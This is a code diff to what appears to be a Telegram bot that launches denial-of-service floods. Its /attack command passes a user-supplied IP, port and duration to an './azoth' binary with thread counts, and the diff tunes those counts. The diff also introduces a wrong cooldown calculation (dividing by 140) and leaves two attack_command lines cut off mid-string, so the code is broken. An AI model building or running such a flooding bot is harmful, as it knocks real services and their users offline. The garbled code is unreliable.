@@ -33,7 +33,7 @@ cooldown_dict = {}
 
 # Default values (in case not set by the admin)
 DEFAULT_BYTE_SIZE = 1024
-DEFAULT_THREADS = 1500
+DEFAULT_THREADS = 1000
 DEFAULT_MAX_ATTACK_TIME = 240
 
 # Adjust this to your local timezone, e.g., 'America/New_York' or 'Asia/Kolkata'
@@ -357,7 +357,7 @@ async def attack(update: Update, context: CallbackContext):
             remaining_time = COOLDOWN_PERIOD - elapsed_time
             await context.bot.send_message(
                 chat_id=chat_id, 
-                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
+                text=f"*⏳ Please wait {remaining_time.seconds // 140} minute(s) and {remaining_time.seconds % 140} second(s) before using /attack again.*", 
                 parse_mode='Markdown'
             )
             return
@@ -398,11 +398,11 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./azoth {ip} {port} {duration} 1024 1000"
+        attack_command = f"./azoth 
     elif argument_type == 4:
-        attack_command = f"./azoth {ip} {port} {duration} 1024 1000"
+        attack_command = f"./azoth 
     elif argument_type == 5:
-        attack_command = f"./azoth {ip} {port} {duration} 1024 1500"
+        attack_command = f"./azoth {ip} {port} {duration} 1024 900"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
